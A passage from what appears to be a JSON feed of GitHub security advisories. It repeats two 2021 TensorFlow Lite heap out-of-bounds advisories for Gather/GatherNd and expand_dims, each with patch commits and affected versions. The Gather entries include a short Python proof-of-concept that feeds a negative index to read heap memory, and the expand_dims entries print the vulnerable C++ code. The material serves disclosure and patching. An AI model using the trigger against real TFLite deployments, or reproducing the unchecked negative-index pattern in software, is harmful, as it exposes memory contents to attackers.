href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-gpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-gpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-gpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-cpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37685\">https://nvd.nist.gov/vuln/detail/CVE-2021-37685</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/advisories/GHSA-c545-c4f9-rf6v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v",
            "title": "[tensorflow-cpu] Heap OOB in TFLite",
            "date_modified": "2024-08-29T21:58:23.000Z",
            "date_published": "2021-08-25T14:40:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c545-c4f9-rf6v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/expand_dims.cc#L36-L50\"><code>expand_dims.cc</code></a> contains a vulnerability which allows reading one element outside of bounds of heap allocated data:</p>\n<pre><code class=\"language-cc\">  if (axis &lt; 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis &lt;= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i &lt; output_dims-&gt;size; ++i) {\n    if (i &lt; axis) {\n      output_dims-&gt;data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims-&gt;data[i] = 1;\n    } else {\n      output_dims-&gt;data[i] = input_dims.data[i - 1];\n    }\n  }\n</code></pre>\n<p>If <code>axis</code> is a large negative value (e.g., <code>-100000</code>), then after the first <code>if</code> it would still be negative. The check following the <code>if</code> statement will pass and the <code>for</code> loop would read one element before the start of <code>input_dims.data</code> (when <code>i = 0</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d94ffe08a65400f898241c0374e9edc6fa8ed257\">d94ffe08a65400f898241c0374e9edc6fa8ed257</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c545-c4f9-rf6v</a></li>\n<li><a 